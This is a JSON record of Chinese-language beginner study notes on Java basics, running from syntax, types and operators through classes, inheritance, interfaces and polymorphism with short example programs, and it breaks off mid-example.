[{"id":"3316961ecf1671c6065b043220187c47","title":"Java基础","content":"基本知识\r\n\r\n大小写敏感\r\n类名：首字母大写（如果类名由若干单词组成，那么每个单词的首字母应该大写）\r\n方法名：小写字母开头（如果方法名含有若干单词，则后面的每个单词首字母大写）\r\n源文件名：源文件名必须和类名相同（如果文件名和类名不相同则会导致编译错误）\r\n\r\n主方法入口：所有的Java程序由\r\npublic static void main(String[] args)\r\n方法开始执行\r\n\r\n\r\n\r\n注释\r\n\r\n单行注释：//\r\n多行注释：\r\n/*\tint c = 1;\n\tint x = 5;\t*/\r\n文档注释：\r\n/**\n*@author(作者)\n*@version(版本)\n**/\r\n\r\n\r\nJava修饰符\r\n用来修饰类中方法和属性\r\n\r\n访问控制修饰符：default、public、protected、private\r\n非访问控制修饰符：final、abstract、static、synchronized\r\n\r\nJava变量\r\n整数类型变量\r\nlong num = 2200000000L;\t//所附的值超出了int类型的取值范围，后面必须加上字母L(如果未超出，可加可不加)\r\n浮点类型变量\r\n在Java中，小数会被默认为double的值\r\nfloat f = 123.4f\t//为一个float类型的变量赋值，后面必须加上字母f(为一个double类型的变量赋值，后面字母d可加可不加)\r\n可以为一个浮点类型变量赋一个整数数值\r\nfloat f = 100;\ndouble b = 100;\r\n布尔类型\r\nboolean\tflag = false;\r\n字符类型变量\r\nchar ch = 97;\t//为一个char类型的变量赋值整数97，相当于赋值字符a\r\n变量的类型转换\r\n自动类型转换（隐式类型转换）\r\n条件：\r\n\r\n两种数据类型彼此兼容\r\n目标类型的其取值范围大于源类型的取值范围\r\n\r\nbyte b = 3;\nint x = b;\r\n强制类型转换（显示类型转换）\r\nbyte b = (byte)num;\r\n示例：\r\n在表达式a+b计算期间，变量a和b被自动提升为int类型，如果这时将结果赋值给byte类型的变量，就会出现报错\r\npackage javaexample;\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tbyte a = 3;\n\t\tbyte b = 3;\n\t\tbyte c = a + b;\t//这里会出错\n\t\tSystem.out.println(c);\n\t}\n}\r\n将出错的代码修改为：\r\nbyte c = (byte)(a + b);\r\n高位字节的数据丢失\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tint num = 298;\n\t\tbyte b;\n\t\tb =(byte)num;\n\t\tSystem.out.println(num);\n\t\tSystem.out.println(b);\n\t}\n}\n\n输出结果：\n298\n42\r\nnum本身的值是298，赋值给b后，b的值变成了42\r\n原因：int占4个字节，byte占1个字节，强制转换后，前三个高位字节的数据丢失\r\n\r\n运算符\r\n赋值运算符\r\nint a = 2;\nint b = a++;\t//要求先赋值，再自增\n\n输出结果：\na=3 b=2\n    \nint a = 2;\nint b = ++a;\t//要求先自增，后赋值\n\n输出结果：\na=3 b=3\r\nint x,y,z;\nx = y = z = 5;\t//Java可以通过一条赋值语句对多个变量同时赋值\n\nint x = y = z =5;\t//这样写法是错误的\r\n\r\n运算符引起的强制类型转换：\r\nshort a = 2;\nint b = 3;\nb += a;\r\n目标类型取值范围小于源类型时，需要进行强制类型转换，但是在是使用+=、-+、*=、/=、%=这些运算符进行赋值时，强制类型转换会自动进行99\r\n\r\n逻辑运算符\r\n\r\n异或（^）：相同为0(false)；不同为1(true)\r\n短路与（&amp;&amp;）、短路或（||）：&amp;&amp;先进行左边的判断，若左边为false则不进行右边的判断；||先进行左边的判断，若左边为true则不进行右边的判断\r\n\r\n语句\r\nif条件语句\r\n\r\nint grade = 75;\nif(grade &gt; 80) {\n\tSystem.out.println(\"该成绩的等级为优\");\n}\nelse if(grade &gt; 70) {\n\tSystem.out.println(\"该成绩的等级为良\");\n}\nelse if(grade &gt; 60) {\n\tSystem.out.println(\"该成绩的等级为中\");\n}\nelse {\n\tSystem.out.println(\"该成绩的等级为差\");\r\n从上到下、一个条件一个条件来判断\r\nwhile语句和do..while语句的区别\r\n\r\nwhile语句是先判断条件再执行语句\r\ndo...while语句是先执行语句再判断条件\r\n\t\tint x = 1;\n\t\tdo {\n\t\t\tSystem.out.println(\"x = \" + x);\n\t\t\tx++;\n\t\t} while(x &lt; 1);\n\n输出结果：\nx\r\n\r\nfor循环打印直角三角形\r\nint i,j;\nfor(i = 1; i &lt;= 9; i++) {\n\tfor(j = 1; j&lt;= i; j++) { \n\t\tSystem.out.print(\"*\");\n\t}\n\tSystem.out.println(\"\\n\");\n}\r\n\r\n注意：在打印时用的是System.out.print，和System.out.println的差别是后者每打印一个就自动换行，而前者不会。\r\n\r\n跳转语句break和continue\r\n\r\nbreak语句：跳出循环\r\nfor(int i = 1; i &lt;= 5; i++) {\n\tSystem.out.println(i);\n\tif(i == 3) {\n\t\tbreak;\n\t}\n}\r\ncontinue语句：终止本次循环，执行下一次循环\r\nfor(int i = 1; i &lt;= 5; i++) {\n\tif(i == 3) {\n\t\tcontinue;\n\t}\n\tSystem.out.println(i);\n}\r\n判断在前面生效，才会执行跳过，操作要在判断后，不然会先被执行\r\n\r\n方法\r\n类似于函数\r\npublic class test {\n    public static void main(String[] args) {\n        printRectangle(3,3);\t//应用方法(无返回值)\n        int area = getArea(3,3);\t//应用方法(有返回值)\n    }\n    \n    public static void printRectangle(int height, int width) {\n        ......\n    }\t//定义方法(无返回值)\n    \n    public static int getArea(int height; int width) {\n        ......\n        return temp;\n    }\t//定义方法(有返回值)\n}\r\n方法的重载\r\n就是在同一个作用域内方法名相同但参数个数或者参数类型不同的方法\r\npublic class test {\n    pubcli static void main(String[] args) {\n        \t\tint sum1 = add(1,3);\n\t\tSystem.out.println(\"sum1 = \" + sum1);\n\t\tint sum2 = add(1,3,5);\n\t\tSystem.out.println(\"sum2 = \" + sum2);\n\t\tdouble sum3 = add(1.2,2.3);\n\t\tSystem.out.println(\"sum3 = \" + sum3);\n    }\n    public static int add(int a, int b) {\n\t\treturn a + b;\n\t}\n\tpublic static int add(int a, int b, int c) {\n\t\treturn a + b + c;\n\t}\n\tpublic static double add(double a, double b) {\n\t\treturn a + b;\n\t}\n} \r\n数组\r\nint[] x;\t//声明一个int[]类型的变量\nx = new int[100];\t//为数组x分配100个元素空间\n\n数组长度： x.length\r\n\r\n在Java中，为方便获取数组的长度，在程序中可以通过数组名.length的方式获得数组的长度\r\n数组被成功创建后，如果没有给数组元素赋值，则数组中元素会被自动赋予一个默认的初始值\r\n\r\n\r\n\r\n数据类型\r\n默认的初始值\r\n\r\n\r\n\r\n\r\nbyte、short、int、long\r\n0\r\n\r\n\r\nfloat、double\r\n0.0\r\n\r\n\r\nchar\r\n一个空字符，即\\u0000\r\n\r\n\r\nboolean\r\nfalse\r\n\r\n\r\n引用数据类型\r\nnull，表示变量不引用任何对象\r\n\r\n\r\n\r\n初始化数组：\r\n\r\n动态初始化\r\nint[] x = new int[3];\nx[0] = 1;\r\n静态初始化\r\nint[] x = { 1, 2, 3, 4};\r\n\r\n注意：这里不能写成\r\nint[] x = new int[4]{ 1, 2, 3, 4};\r\n会报错，因为编译器会认为数组限定的元素个数[4]与实际存储的元素{ 1, 2, 3, 4}个数有可能不一致\r\n\r\n\r\n在使用变量引用一个数组的时候，变量必须指向一个有效的数组对象\r\n\r\n数组的排序（冒泡排序）\r\npublic class test {\n    public static void main(String[] args) {\n        \t\tint[] arr = { 9, 8, 3, 5, 2 };\n\t\tSystem.out.print(\"冒泡排序前 ：\");\n\t\tprintArray(arr);\t\t//打印数组元素\n\t\tbubbleSort(arr);\t\t//冒泡排序\n\t\tSystem.out.print(\"冒泡排序后 ：\");\n\t\tprintArray(arr);\n    }\n    \n    \tpublic static void printArray(int[] arr) {\n\t\tfor( int i = 0; i &lt; arr.length; i++) {\n\t\t\tSystem.out.print(arr[i] + \" \");\t\t//注意打印一个空格\n\t\t}\n\t\tSystem.out.print(\"\\n\");\n\t}\n\t\n\tpublic static void bubbleSort(int[] arr) {\n\t\tfor( int i = 0; i &lt; arr.length-1; i++) {\n\t\t\tfor( int j = 0; j &lt; arr.length-1-i; j++) {\t//注意这里是j&lt;arr.length-1-i\n\t\t\t\tif(arr[j] &gt; arr[j+1]) {\t\t//比较相邻元素\n\t\t\t\t\tint  t = arr[j];\n\t\t\t\t\tarr[j] = arr[j+1];\n\t\t\t\t\tarr[j+1] = t;\n\t\t\t\t}\n\t\t\t}\n\t\t\tSystem.out.print(\"第\" + (i+1) +\"轮排序后 ：\");\n\t\t\tprintArray(arr);\n\t\t}\n\t}\n}\r\n二维数组\r\nint[][] arr = new int[3][];\narr[0] = new int[] {11, 12 };\narr[1] = new int[] {21, 22, 23 };\narr[2] = new int[] {31, 22, 33, 44 };\nint sum = 0;\nfor(int i = 0; i &lt; arr.length; i++) {\n\tint groupSum = 0;\n\tfor(int j = 0; j &lt; arr[i].length; j++) {\n\t\tgroupSum += arr[i][j];\n\t}\n\tsum += groupSum;\n\tSystem.out.println(\"第\" + (i+1) + \"小组的销售额为 ：\" + groupSum + \"万元。\");\n}\nSystem.out.println(\"总销售额为：\" + sum + \"万元。\");\r\n注意二维数组的定义和表示方式\r\nJava枚举\r\nclass FreshJuice {\n    enum FrenshJuiceSize{ SAMLL, MEDIUM, LARGE }\n    FreshJuiceSize size;\n}\n\npublic class FreshJuiceTest {\n    public static viod main(string[] args){\n        FrenshJuice juice = new FrenshJuice();\n        juice.size = FreshJuice.FreshJuiceSize.MEDIUM;\n    }\n}\r\n\r\n注意：枚举可以单独声明或者声明在类里面。方法、变量、构造函数也可以在枚举中定义。\r\n\r\n面向对象\r\n类和对象\r\n\r\n定义一个类\r\nclass Student {\n\tString name;\n\tint age;\n\tString sex;\n\t//定义read()方法\n\tvoid read() {\n\t\tSystem.out.println(\"大家好，我是\" + name + \"，我在看书！\");\n\t}\n}\r\n利用上面的类定义创建并使用一个对象\r\npublic class test {\n\tpublic static void main(String[] args) {\n        //创建一个对象\n\t\tStudent stu = new Student();\n\t\tstu.name = \"小明\";\t//为stu对象的name属性赋值\n\t\tstu.read();\t\t//调用对象的方法\n\t}\n}\t\r\n内存变化\r\n\r\n\r\n对象的引用传递\r\n类属于引用数据类型，引用数据类型就是指内存空间可以同时被多个占内存引用\r\n\t\tStudent stu1 = new Student();\n\t\tStudent stu2 = null;\t//声明stu2对象，但不实例化\n\t\tstu2 = stu1;\t\t//stu1给stu2分配空间使用权\n\t\tstu1.name = \"小明\";\n\t\tstu1.age = 20;\n\t\tstu2.age = 50;\n\t\tstu1.read();\n\t\tstu2.read();\n\n输出结果：\n大家好，我是小明，年龄50\n大家好，我是小明，年龄50    \r\n\r\n\r\n\r\n注意：一个栈内存空间只能指向一个堆内存空间，如果想要再指向其他的堆内存空间，就必须先断开已有的指向后才能再分配新的指向。\r\n\r\n访问控制\r\n\r\n\r\n\r\n访问范围\r\nprivate\r\ndefault\r\nprotected\r\npublic\r\n\r\n\r\n\r\n\r\n同一类中\r\n√\r\n√\r\n√\r\n√\r\n\r\n\r\n同一包中的类\r\n\r\n√\r\n√\r\n√\r\n\r\n\r\n不同包的子类\r\n\r\n\r\n√\r\n√\r\n\r\n\r\n全局范围\r\n\r\n\r\n\r\n√\r\n\r\n\r\n\r\nprivate私有变量和方法\r\nclass Tom {\n    private float weight;\t//private的变量\n    private float f(float a, float b) {\t\t//private的方法\n        return a+b;\n    }\n}\n\nclass Jerry {\n    void g() {\n        Tom cat = new Tom();\n        cat.weight = 23f;\t//非法\n        float sum = cat.f(3,4);\t\t//非法\n    }\n}\r\n只有在本类中创建该类的对象时，这个对象才能访问自己的私有成员变量和类中的私有方法：\r\nclass test {\n    private int money;\n    private int getMoney() {\n        return money;\n    }\n    \n    public static void main(String[] args) {\n        test exa = new test();\n        exa.money = 3000;\t//合法\n        int m = exa.getMoney();\t\t//合法\n        System.out.println(\"money = \" + m);\n    }\n}\r\n\r\n总结：当用某个类在另外一个类中创建对象后，如果不希望该对象直接访问自己的变量（通过.运算符来操作自己的变量），应当将成员变量的访问权限设置为private\r\n\r\n友好变量和方法\r\n不用private、public、protected修饰符的成员变量和方法被称为友好变量和友好方法\r\n在同一个包中，对象可以访问自己的友好变量和友好方法\r\nprotected受保护的成员变量和方法\r\n和友好变量和方法类似\r\n在同一个包内，对象可以访问（区别在后面）\r\n\r\nJava程序的文件名：如果一个Java源文件中定义的所有类都没有使用public修饰，那么这个Java源文件的文件名可以是一切合法的文件名；如果一个源文件定义了一个public修饰的类，那么这个源文件的文件名必须与public修饰的类名相同（一个Java文件中只能有一个public修饰的类名）\r\n\r\n类的封装\r\n问题代码：\r\nclass Student {\n    String name;\n    int age;\n    void read() {\n        System.out.println(\"大家好，我是\" + name + \"，年龄\" + age) ;\n    }\n}\n\npublic class test {\n    public static void main(String[] args) {\n        Student stu = new Student();\n        stu.name = \"张三\";\n        stu.age = -18;\n        stu.read();\n    }\n}\r\n在程序中没有问题，但是在现实中，年龄为-18就是一个不合理的数值，所以要实现类的封装\r\n在定义一个类的时候，将类中的属性私有化，即使用private关键字修饰类的属性，被私有化的属性只能在类中被访问。如果外界想要访问私有属性，则必须通过setter和getter方法设置和获取属性值\r\n修正代码：\r\nclass Student {\n\tprivate String name;\n\tprivate int age;\t//封装\n\tpublic String getName() {\n\t\treturn name;\n\t}\n\tpublic void setName(String name) {\n\t\tthis.name = name;\n\t}\n\tpublic int getAge() {\n\t\treturn age;\n\t}\n\tpublic void setAge(int age) {\n\t\tif(age &lt;= 0) {\t\t//判断\n\t\t\tSystem.out.println(\"您输入的年龄有误！\");\n\t\t} else {\n\t\t\tthis.age = age;\n\t\t}\n\t}\n\tpublic void read() {\n\t\tSystem.out.println(\"大家好，我是\" + name + \"，年龄\" + age);\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tStudent stu = new Student();\n\t\tstu.setName(\"张三\");\n\t\tstu.setAge(-18);\n\t\tstu.read();\n\t}\n}\r\n构造方法\r\n构造方法的名称必须与类名一致；构造方法名称前不能有任何返回值类型的声明；不能在构造方法中使用return返回一个值，但是可以单独写return语句作为方法的结束\r\n\r\n无参构造方法\r\nclass Student {\n\tpublic Student() {\n\t\tSystem.out.println(\"调用了无参构造方法\");\n\t}\n}\n\npublic class test {\n\tstatic public void main(String[] args) {\n\t\tSystem.out.println(\"声明对象...\");\n\t\tStudent stu = null;\n\t\tSystem.out.println(\"实例化对象...\");\n\t\tstu = new Student();\n\t}\n}\r\n有参构造方法\r\nclass Student {\n\tprivate String name;\n\tprivate int age;\n\tpublic Student(String n, int a) {\n\t\tname = n;\n\t\tage = a;\n\t}\n\tpublic void read() {\n\t\tSystem.out.println(\"我是：\" + name +\"，年龄\" + age);\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tStudent stu = new Student(\"张三\", 18);\n\t\tstu.read();\n\t}\n}\r\n\r\n构造方法的重载\r\n在一个类中可以定义多个构造方法，只要每个构造方法的参数类型或参数个数不同即可\r\nclass Student {\n\tprivate String name;\n\tprivate int age;\n\tpublic Student() { }\n\tpublic Student(String n) {\n\t\tname = n;\n\t}\n\tpublic Student(String n, int a) {\n\t\tname = n;\n\t\tage = a;\n\t}\n\tpublic void read() {\n\t\tSystem.out.println(\"我是：\" + name + \"，年龄：\" + age);\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tStudent stu1 = new Student(\"张三\");\n\t\tStudent stu2 = new Student(\"李四\", 18);\n\t\tstu1.read();\n\t\tstu2.read();\n\t}\n}\r\n\r\n注意：如果定义了一个有参构造方法，这时系统就不再提供默认的构造方法，如果此时再用下面这种方式定义对象就会报错\r\nStudent stu = new Student();\r\n\r\nthis关键字\r\n\r\n使用this关键字调用本类中的属性\r\nclass Student {\n\tprivate String name;\n\tprivate int age;\n\tpublic Student(String name, int age) {\n\t\tthis.name = name;\n\t\tthis.age = age;\n\t}\n\tpublic String read() {\n\t\treturn \"我是：\" + name + \"，年龄：\" + age;\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tStudent stu = new Student(\"张三\", 18);\n\t\tSystem.out.println(stu.read());\n\t}\n}\n\n//如果没有this，编译器无法确定哪个名称是当前对象的属性，出来的结果是null和0\r\n使用this关键字调用成员方法\r\nclass Student {\n    public void openMouth() {\n        ...\n    }\n    public void read() {\n        this.openMouth();\n    }\n}\r\n此处的this关键字也可以省略不写\r\n使用this关键字调用本类的构造方法\r\n\r\n只能在构造方法中使用this调用其他的构造方法，不能在成员方法中通过this调用其他的构造方法\r\n在构造方法中，使用this调用构造方法的语句必须位于第一行，且只能出现一次\r\n不能在一个类的两个构造方法中使用this互相调用。错误示例：\r\nclass Student {\n    public Student() {\n        this(\"张三\");\n        System.out.println(\"无参的构造方法被调用了。\");\n    }\n    public Student(String name) {\n        this();\n        System.out.println(\"有参的构造方法被调用了。\");\n    }\n}\r\n\r\nclass Student {\n\tprivate String name;\n\tprivate int age;\n\tpublic Student() {\n\t\tSystem.out.println(\"实例化了一个新的Student对象。\");\n\t}\n\tpublic Student(String name, int age) {\n\t\tthis();\n\t\tthis.name = name;\n\t\tthis.age = age;\n\t}\n\tpublic String read() {\n\t\treturn \"我是：\" + name + \"，年龄：\" +age;\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tStudent stu = new Student(\"张三\", 18);\n\t\tSystem.out.println(stu.read());\n\t}\n}\n\n输出结果：\n实例化了一个新的Student对象。\n我是：张三，年龄：18\r\n\r\n代码块\r\n\r\n普通代码块：每一对{}括起来的代码都称为一个代码块\r\n构造块（构造代码块）：直接在类中定义的代码块\r\n构造块定义在成员位置，与构造方法、成员属性同级\r\nclass Student {\n\t\tpublic Student() {\n\t\tSystem.out.println(\"我是Student类的构造方法\");\n\t}\n\t\n\t{\n\t\tSystem.out.println(\"我是构造代码块\");\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tStudent stu = new Student();\n\t}\n}\n\n输出结果：\n我是构造代码块\n我是Student类的构造方法\r\n\r\n注意：先输出了我是构造代码块，表面构造代码块的执行顺序优先于构造方法（这里的执行顺序与代码块写在前面还是后面无关）\r\n\r\n静态代码块\r\n用static关键字修饰的代码块称为静态代码块。\r\n当类被加载时，静态代码块会被执行，由于类只加载一次，因此静态代码块只执行一次。\r\n在程序中，通常使用静态代码块对类的成员变量进行初始化。\r\nclass Student {\n\t{\n\t\tSystem.out.println(\"我是构造代码块\");\n\t}\n\tstatic {\n\t\tSystem.out.println(\"我是静态代码块\");\n\t}\n\tpublic Student() {\n\t\tSystem.out.println(\"我是Student类的构造方法\");\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tStudent stu1 = new Student();\n\t\tStudent stu2 = new Student();\n\t}\n}\n\n输出结果：\n我是静态代码块\n我是构造代码块\n我是Student类的构造方法\n我是构造代码块\n我是Student类的构造方法\r\n\r\n代码块的执行顺序：\r\n静态代码块&gt;构造代码块&gt;构造方法\r\nstatic修饰的成员变量会随class文件一同被加载，其优先级最高\r\n\r\n同步代码块\r\n\r\nstatic关键字\r\n静态属性\r\n使用static修饰属性，则该属性称为静态属性，就静态属性可以用类名直接访问\r\nclass Student {\n\tString name;\n\tint age;\n\tstatic String school = \"A大学\";\t//static关键字修饰属性\n\tpublic Student(String name, int age) {\n\t\tthis.name = name;\n\t\tthis.age = age;\n\t}\n\tpublic void info() {\n\t\tSystem.out.println(\"姓名：\" + this.name + \"，年龄：\" + this.age + \"，学校：\" + school);\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tStudent stu1 = new Student(\"张三\", 18);\n\t\tStudent stu2 = new Student(\"李四\", 19);\n\t\tStudent stu3 = new Student(\"王五\", 20);\n\t\tstu1.school = \"B大学\";\n\t\tstu1.info();\n\t\tstu2.info();\n\t\tstu3.info();\n\t}\n}\n\n输出结果：\n姓名：张三，年龄：18，学校：B大学\n姓名：李四，年龄：19，学校：B大学\n姓名：王五，年龄：20，学校：B大学\r\n\r\n注意：如果这里没有用static关键字来修饰属性，如果已经产生了n个对象，要想将这n个对象的school属性修改，就要修改n次，而利用static关键字就只要修改一次\r\n没有用static关键字修饰属性，最后的输出结果是：\r\n姓名：张三，年龄：18，学校：B大学\n姓名：李四，年龄：19，学校：A大学\n姓名：王五，年龄：20，学校：A大学\r\n\r\n\r\nstatic不能修饰局部变量：\r\nstatic关键字只能修饰成员变量，不能修饰局部变量，否则编译器会报错。\r\npublic class Student() {\n public void study() {\n     static int num = 10;\t//非法\n }\n}\r\n\r\n静态方法\r\nclass Student {\n\tprivate String name;\n\tprivate int age;\n\tprivate static String school = \"A大学\";\t//static声明\n\tpublic Student(String name, int age) {\n\t\tthis.name = name;\n\t\tthis.age = age;\n\t}\n\tpublic void info() {\n\t\tSystem.out.println(\"姓名：\" + this.name + \"，年龄：\" + this.age + \"，学校：\" + school);\n\t}\n\tpublic String getName() {\n\t\treturn name;\n\t}\n\tpublic void setName(String name) {\n\t\tthis.name = name;\n\t}\n\tpublic int getAge() {\n\t\treturn age;\n\t}\n\tpublic void setAge(int age) {\n\t\tthis.age = age;\n\t}\n\tpublic static String getSchool() {\n\t\treturn school;\n\t}\n\tpublic static void setSchool(String school) {\t//静态方法\n\t\tStudent.school = school;\t//这里必须用类名，不能用this\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tStudent stu1 = new Student(\"张三\", 18);\n\t\tStudent stu2 = new Student(\"李四\", 19);\n\t\tStudent stu3 = new Student(\"王五\", 20);\n\t\tstu1.setAge(20);\n\t\tstu2.setName(\"小明\");\n\t\tStudent.setSchool(\"B大学\");\n\t\tstu1.info();\n\t\tstu2.info();\n\t\tstu3.info();\n\t}\n}\r\n\r\n注意：静态方法只能访问静态成员，因为非静态成员需要先创建对象才能访问，即随着对象的创建，非静态成员才会被分配内存。而静态方法在调用时可以不创建任何对象。\r\n\r\n类的继承\r\nclass 子类 extends 父类 {\n    ......\n}\r\nclass Animal {\n\tprivate String name;\n\tprivate int age;\n\tpublic String getName() {\n\t\treturn name;\n\t}\n\tpublic void setName(String name) {\n\t\tthis.name = name;\n\t}\n\tpublic int getAge() {\n\t\treturn age;\n\t}\n\tpublic void setAge(int age) {\n\t\tthis.age = age;\n\t}\n}\n\nclass Dog extends Animal {\n\t\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tDog dog = new Dog();\n\t\tdog.setName(\"牧羊犬\");\n\t\tdog.setAge(3);\n\t\tSystem.out.println(\"名称：\" + dog.getName() + \"，年龄：\" + dog.getAge());\n\t}\n}\r\n\r\n一个类只能有一个直接父类\r\n下面的情况就是不合法的\r\nclass A {}\nclass B {}\nclass C extends A,B {}\t//非法\r\n多个类可以继承一个父类\r\nclass A {}\nclass B extends A {}\t//合法\nclass C extends A {}\t//合法\r\n一个类的父类可以再继承另外的父类\r\nclass A {}\nclass B extends A{}\nclass C extends B{}\t//C是B类的子类，同时也是A类的子类\r\n在继承中，子类不能直接访问父类中的私有成员，子类可以调用父类的非私有方法，但是不能调用父类的私有成员\r\n\r\n方法的重写\r\n在继承关系中，子类会自动继承父类中定义的方法，但有时候子类需要对继承的方法进行一些修改\r\n\r\n在子类中重写的方法需要和父类被重写的方法具有相同的方法名、参数列表和返回值类型\r\n子类重写的方法不能拥有比父类更严格的访问权限\r\n\r\nclass Animal {\n\tvoid shout() {\n\t\tSystem.out.println(\"动物发出叫声\");\n\t}\n}\n\nclass Dog extends Animal {\n\tvoid shout() {\n\t\tSystem.out.println(\"汪汪汪\");\t\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tDog dog = new Dog();\n\t\tdog.shout();\n\t}\n}\r\nsuper关键字\r\n在子类重写父类的方法后，子类对象将无法访问父类被重写的方法\r\n\r\nsuper关键字可以在子类中调用父类的普通属性、方法\r\nclass Animal {\n\tString name = \"牧羊犬\";\n\tvoid shout() {\n\t\tSystem.out.println(\"动物发出叫声\");\n\t}\n}\n\nclass Dog extends Animal {\n\tpublic void shout() {\t//重写父类Animal中的shout()方法，扩大了访问范围\n\t\tsuper.shout();\t//调用父类的shout()方法\n\t\tSystem.out.println(\"汪汪汪\");\n\t}\n\tpublic void printName() {\n\t\tSystem.out.println(\"名字：\" + super.name);\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tDog dog = new Dog();\n\t\tdog.shout();\n\t\tdog.printName();\n\t}\n}\r\nsuper关键字访问父类中指定的构造方法\r\nclass Animal {\n\tprivate String name;\n\tprivate int age;\n\tpublic Animal(String name, int age) {\n\t\tthis.name = name;\n\t\tthis.age = age;\n\t}\n\tpublic String getName() {\n\t\treturn name;\n\t}\n\tpublic void setName(String name) {\n\t\tthis.name = name;\n\t}\n\tpublic int getAge() {\n\t\treturn age;\n\t}\n\tpublic void setAge(int age) {\n\t\tthis.age = age;\n\t}\n\tpublic String info() {\n\t\treturn \"名称：\" + this.getName() + \"，年龄：\" + this.getAge();\n\t}\n}\n\nclass Dog extends Animal {\n\tprivate String color;\n\tpublic Dog(String name, int age, String color) {\n\t\tsuper(name, age);\n\t\tthis.setColor(color);\n\t}\n\tpublic String getColor() {\n\t\treturn color;\n\t}\n\tpublic void setColor(String color) {\n\t\tthis.color = color;\n\t}\n\tpublic String info() {\n\t\treturn super.info() + \"，颜色：\" + this.getColor();\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tDog dog = new Dog(\"牧羊犬\", 3, \"黑色\");\n\t\tSystem.out.println(dog.info());\n\t}\n}\r\n\r\n\r\n注意：\r\n通过super()调用父类构造方法的代码必须位于子类构造方法的第一行，并且只能出现一次。\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n区别点\r\nthis\r\nsuper\r\n\r\n\r\n\r\n\r\n属性访问\r\n访问本类中的属性，如果本类中没有该属性，则从父类中查找\r\n直接访问父类中的属性\r\n\r\n\r\n方法\r\n访问本类中的方法，如果本类中没有该方法，则从父类中继续查找\r\n直接访问父类中的方法\r\n\r\n\r\n调用构造\r\n调用本类构造，必须放在构造方法的首行\r\n调用父类构造，必须放在子类构造方法的首行\r\n\r\n\r\n\r\n所以在调用构造中，this和super两者不可同时出现，因为他们在调用构造方法时都要求必须放在构造方法的首行\r\n\r\nfinal关键字\r\n\r\n用final修饰的类不能有子类\r\nfinal class Animal {}\n\nclass Dog extends Animal {}\t//非法\r\n用final修饰的方法不能被子类重写\r\nclass Animal {\n    public final void shout() {}\n}\n\nclass Dog extends Animal {\n    public void shout() {}\t//非法\n}\r\n用final修饰的变量（成员变量和局部变量）是常量，常量不可修改\r\npublic class test {\n    public static void main(String[] args) {\n        final int AGE = 18;\n        AGE = 20;\t//非法\n    }\n}\r\n\r\n注意：\r\n在使用final声明变量时，要求全部的字母大写。如果一个程序中的变量使用public static final声明，则此变量将成为全局常量：\r\npublic static final String NAME = \"哈士奇\";\r\n\r\n\r\n抽象类和接口\r\n抽象类\r\n\r\n包含抽象方法的类必须是抽象类\r\n抽象类和抽象方法都要使用abstract关键字声明\r\n抽象方法只需声明而不需要实现\r\n如果一个非抽象类继承了抽象类，那么该子类必须实现抽象类中的全部抽象方法\r\n\r\nabstract class Animal {\n\tabstract void shout();\n}\n\nclass Dog extends Animal {\n\tvoid shout() {\n\t\tSystem.out.println(\"汪汪汪\");\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tDog dog = new Dog();\n\t\tdog.shout();\n\t}\n}\r\n\r\n注意：使用abstract关键字修饰的抽象方法不能使用private修饰，因为抽象方法必须被子类实现。\r\n\r\n接口\r\n如果一个抽象类的所有方法都是抽象的，则可以将这个类定义接口。\r\n接口中除了包括抽象方法外，还可以包括默认方法和静态方法（也叫类方法），默认方法使用default修饰，静态方法使用static修饰，且这两种方法都允许有方法体。\r\n接口的声明\r\npublic interface 接口名 extends 接口1，接口2......\r\n\r\n注意：\r\n一个类只能有一个父类，而一个接口可以同时继承多个父接口。\r\n接口中的变量默认使用public static final进行修饰，即全局常量。\r\n接口中定义的方法默认使用public abstract进行修饰，即抽象方法。\r\n如果接口声明为public，则接口中的常量和方法全部为public。\r\n不管写不写访问权限，接口中方法的访问权限永远是public。\r\n\r\n定义接口的实现类\r\n修饰符 class 类名 implements 接口1，接口2，...... {\n    ...\n}\r\ninterface Animal {\n\tint ID = 1;\n\tString NAME = \"牧羊犬\";\n\tvoid shout() ;\n\tstatic int getID() {\n\t\treturn Animal.ID;\n\t}\n\tpublic void info() ;\n}\n\ninterface Action {\n\tpublic void eat() ;\n}\n\nclass Dog implements Animal, Action {\n\tpublic void eat() {\n\t\tSystem.out.println(\"喜欢吃骨头\");\n\t}\n\tpublic void shout() {\n\t\tSystem.out.println(\"汪汪汪\");\n\t}\n\tpublic void info() {\n\t\tSystem.out.println(\"名称：\" + NAME);\n\t}\n}\n\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tSystem.out.println(\"编号\" + Animal.ID);\n\t\tDog dog = new Dog();\n\t\tdog.info();\n\t\tdog.shout();\n\t\tdog.eat();\n\t}\n}\r\n\r\n注意：接口中定义常量时，可以省略前面的public static final，此时，接口会默认为常量添加public static final。\r\n接口中的静态方法可以直接使用接口名进行调用。\r\n接口的实现类，必须实现接口中的所有方法，否则程序编译报错。\r\n\r\n一个类既要实现接口，又要继承抽象类\r\n修饰符 class 类名 extends 父类名 implements 接口1，接口2，... {\n    ...\n}\r\n\r\n注意：接口是不允许继承抽象类的，但是允许一个接口继承多个接口。\r\n\r\n多态\r\n多态是指不同对象在调用同一个方法时做出的多种不同行为。\r\n在同一个方法中，这种由于参数类型不同而导致效果不同的现象就是多态。\r\n多态主要有以下两种形式：\r\n\r\n方法的重载\r\n对象的多态性（方法重写）\r\n\r\nabstract class Animal {\n\tabstract void shout();\n}\n\nclass Cat extends Animal {\n\tpublic void shout() {\n\t\tSystem.out.println(\"喵喵\");\n\t}\n}\n\nclass Dog extends Animal {\n\tpublic void shout() 